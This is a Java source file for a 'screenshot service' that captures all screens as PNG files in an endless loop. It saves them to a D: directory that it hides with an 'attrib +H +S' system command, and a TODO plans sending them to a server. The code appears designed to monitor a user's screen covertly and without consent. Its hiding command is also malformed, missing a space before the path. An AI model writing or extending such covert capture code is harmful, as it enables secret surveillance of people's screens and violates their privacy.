/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package screenshotservice;

import java.awt.AWTException;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Date;
import javax.imageio.ImageIO;

/**
 *
 * @author ncuxap
 */
public class ScreenShot {

    /**
     * @param args the command line arguments
     */
    // TODO: make new thread for sending pictures to server maybe?
    private final String ClientName; 
    private static final String DefautName = "";
    private static int NextID = 0;
    
    public ScreenShot(String Name)
    {
        ClientName = Name;
    }
    
    private String GenerateUniqueFileName()
    {
        String result; 
        Date now = new Date();
        String nowString = now.toString().replace(':','_');
        result =  ClientName + "_" + nowString;
        return result;        
    }
    
    public String MakeScreenShot() throws InterruptedException, AWTException, IOException {
        // TODO code application logic here
        String picturesPath = "D:" + File.separator + "4okoloko";
        
        // creating directory
        File pictureDir = new File(picturesPath);
        pictureDir.mkdir();
        
        // making it hidden (using cmd commands)
        Runtime.getRuntime().exec("attrib +H +S" + picturesPath);
        
        while(true)
        {
            String ScreenShotName = GenerateUniqueFileName();
            
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] screens = ge.getScreenDevices();

            Rectangle allScreenBounds = new Rectangle();
            for (GraphicsDevice screen : screens) {
                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();

                allScreenBounds.width += screenBounds.width;
                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
            }

            Robot robot = new Robot();
            BufferedImage screenShot = robot.createScreenCapture(allScreenBounds);

            String fileName = picturesPath + File.separator + GenerateUniqueFileName()+ ".png";
            
            File outputFile = new File(fileName);
            outputFile.createNewFile();
            
            ImageIO.write(screenShot, "png", outputFile);
        }   
    }
}
